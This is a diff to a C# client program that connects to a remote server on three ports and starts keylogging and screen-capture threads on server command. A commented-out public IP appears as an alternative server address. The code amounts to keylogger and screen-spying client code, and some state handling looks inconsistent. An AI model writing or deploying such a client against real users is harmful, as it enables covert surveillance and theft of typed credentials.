@@ -36,6 +36,7 @@ namespace Client
         private Thread ClientConnect;
         private Thread ScreenThread;
 
+        private static ManualResetEvent screenEvent = new ManualResetEvent(false);
         string password;
 
         bool isKeyThreadStart = false;
@@ -61,22 +62,18 @@ namespace Client
                 keylogClient = new TcpClient();
                 shareClient = new TcpClient();
 
-                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12000);
-                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12001);
-                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12002);
+                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9000);
+                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9001);
+                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9002);
 
                 /*IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 14232);
                 IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 15202);
                 IPShare = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 12896);*/
-                /*
-                string servername = "";
-                var address = Dns.GetHostAddresses(servername);
-                Debug.Assert(address.Length != 0);
-                var endPoint = new IPEndPoint(address[0], 8080);
-
-                server = new TcpClient(endPoint);
-
-                */
+    
+                ScreenThread = new Thread(SendImage);
+                ScreenThread.IsBackground = true;
+                BeginKeylg = new Thread(KeyLog);
+                BeginKeylg.IsBackground = true;
 
 
 
@@ -117,6 +114,7 @@ namespace Client
             }
             catch (Exception ex)
             {
+                
                 MessageBox.Show(ex.ToString());
             }
         }
@@ -147,13 +145,21 @@ namespace Client
                     {
                         if (command =="Share-Screen")
                         {
-                            if (!isScreenThreadStart)
+                            if (!ScreenThread.IsAlive)
                             {
                                     isScreenThreadStart = true;
                                     BeginThreadShareScreen();
-
+                            }
+                            else
+                            {
+                                isKeyThreadStart= false;
+                                screenEvent.Set();
                             }
                         }
+                    }
+                    if(command =="Stop-Share")
+                    {
+                        isScreenThreadStart = true;
                     }
                 }
 
@@ -189,10 +195,7 @@ namespace Client
             try
             {
                 isScreenThreadStart= true;
-
-                ScreenThread = new Thread(SendImage);
                 ScreenThread.Start();
-                ScreenThread.IsBackground = true;
 
                 ScreenStream = shareClient.GetStream();
             }
